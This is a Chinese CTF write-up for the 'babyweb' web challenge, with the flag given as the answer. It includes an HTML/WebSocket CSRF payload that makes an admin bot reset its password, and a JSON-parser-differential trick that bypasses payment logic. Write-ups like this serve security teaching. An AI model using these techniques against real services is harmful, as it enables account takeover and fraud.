# babyweb

> 分类：Web

## 题目描述

注册登录后通过 websocket 与管理员交互（bugreport 可让管理员访问任意 URL），构造 CSRF 修改管理员密码，再用 JSON 解析差异绕过购买逻辑获取 flag。

## 考察知识点

- WebSocket CSRF（bot 模拟访问）
- Python/Go JSON 解析差异（重复字段、空白符绕过）
- 内网 SSRF

## 解法

1. 任意注册账号，`help` 查看 websocket 指令：`changepw`、`bugreport`。`bugreport` 用 PhantomJS 模拟管理员访问 URL。
2. 在自己 VPS 上放一个 html，用 websocket 连 `ws://127.0.0.1:8888/bot` 发送 `changepw 123456`（端口来自题目给的 docker 启动命令 8888）：

```html
<script>
var ws = new WebSocket("ws://127.0.0.1:8888/bot");
ws.onopen = function () { ws.send("changepw 123456"); }
</script>
```

3. 发送 `bugreport http://xxx.xxx.xxx.176:8010/3.html`，管理员登录密码被改为 123456。
4. 管理员登录后买 hint，得到部分源码：`app.py`（Python）与 `pay.go`（Go）。Python 用 `request.get_json()` 解析，Go 用 `jsonparser` 解析，拼接 JSON 时 `request.get_data()[1:]` 切掉第一个 `{`。
5. 利用 jsonparser 特性：请求体最前面加一个空白符（空格/制表符/回车/换行），Python 仍能正常解析，但传给 Go 时 `{` 被保留导致 `product` 解析出错，`cost` 保持 0，从而免费购买 flag。

最终在请求体前加空格即可购买成功。

## 参考答案

`flag{18b12c6c-b5cf-4d18-baba-ce5536d15b0a}`

## 来源

- 作者：404Team | https://www.nynusec.com/archives/第六届强网杯-writeup
- 作者：or4nge | https://note.f5.pm/go-125939.html
- 作者：WHT战队 | https://cn-sec.com/archives/1217881.html
